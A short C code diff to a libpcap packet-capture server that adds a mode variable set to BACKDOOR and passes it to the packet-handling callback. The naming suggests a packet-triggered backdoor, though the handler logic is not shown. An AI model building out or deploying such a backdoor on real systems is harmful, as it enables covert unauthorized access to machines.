@@ -1,6 +1,8 @@
 #include <pcap/pcap.h>
 #include <stdio.h>
 #include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
 
 #include <errno.h>
 
@@ -55,6 +57,8 @@ int start_server(char* program_name)
     int i = 0;
     char errbuf[PCAP_ERRBUF_SIZE];
 
+    Mode mode = BACKDOOR;
+
     if (pcap_findalldevs(&alldevs, errbuf) == -1)
     {
         fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
@@ -101,7 +105,7 @@ int start_server(char* program_name)
     }
 
     // Start capturing packets
-    pcap_loop(session, 0, got_packet, NULL);
+    pcap_loop(session, 0, got_packet, (u_char*)&mode);
 
     // Clean up handles
     pcap_freealldevs(alldevs);
